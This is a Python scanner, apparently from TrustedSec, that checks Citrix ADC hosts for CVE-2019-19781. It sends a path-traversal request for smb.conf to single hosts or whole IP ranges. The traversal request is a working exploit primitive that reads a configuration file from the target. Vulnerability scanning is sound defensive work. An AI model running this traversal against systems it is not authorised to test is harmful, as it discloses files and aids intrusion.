#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CVE-2019-19781
# Written by: Dave Kennedy
# Company: TrustedSec
#
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings
import argparse
from netaddr import IPNetwork
import threading

# You can up this if you want to make it faster - default is 100

# our main function for testing the vulnerability
def check_server(target, targetport):
    try:
        # if for some ungodly reason they are using HTTP
        if targetport == "80":
            req = requests.get("http://%s:%s/vpn/../vpns/cfg/smb.conf" % (target,targetport), verify=False, timeout=2)
        else:
            # for all other handle HTTPS
            req = requests.get("https://%s:%s/vpn/../vpns/cfg/smb.conf" % (target,targetport), verify=False, timeout=2)
        if ("global") in str(req.content): # each smb.conf will contain a [global] variable
            print("[\033[91m!\033[0m] This Citrix ADC Server: %s is still vulnerable to CVE-2019-19781." % (target))
        elif ("Citrix") in str(req.content) or "403" in str(req.status_code): # only seen if system is not vulnerable
            print("[\033[92m*\033[0m] Awesome! The server %s is not vulnerable." % (target))
        else:
            print("[-] Server %s does not appear to be a Citrix server." % (target))

    # handle exception errors due to timeouts
    except Exception: 
        print("[-] Server %s timed out and didn't respond on port: %s." % (target, targetport))

print("""
   _______      ________    ___   ___  __  ___        __  ___ ______ ___  __ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |/ _ \____  / _ \/_ |
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | (_) |  / / (_) || |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| |\__, | / / > _ < | |
 | |____   \  /  | |____    / /_| |_| || |  / /       | |  / / / / | (_) || |
  \_____|   \/   |______|  |____|\___/ |_| /_/        |_| /_/ /_/   \___/ |_|
     

CVE-2019-19781-Scanner

Company: TrustedSec
Written by: Dave Kennedy

This will look to see if the remote system is still vulnerable to CVE-2019-19781. This 
will only scan one host at a time.

You can use CIDR notations as well for example: 192.168.1.1/24
You can use hostnames instead of IP addresses also.

Example: python3 cve-2019-19781_scanner.py 192.168.1.1/24 443
Example2: python3 cve-2019-19781_scanner.py 192.168.1.1 443
Example3: python3 cve-2019-19781_scanner.py fakewebsiteaddress.com 443

Usage: python3 cve-2019-19781_scanner.py targetip targetport
""")

# parse our commands
parser = argparse.ArgumentParser()
parser.add_argument("target", help="the vulnerable server with Citrix (defaults https)")
parser.add_argument("targetport", help="the target server web port (normally on 443)")
args = parser.parse_args()

# if we are iterating through IP addresses to scan CIDR notations 
if "/" in args.target:
    for ip in IPNetwork(args.target):
        thread = threading.Thread(target=check_server, args=(ip,args.targetport))
        thread.start()

    # wait for the threads to complete
    thread.join()

# if we are just using 1 IP address
else: check_server(args.target, args.targetport)



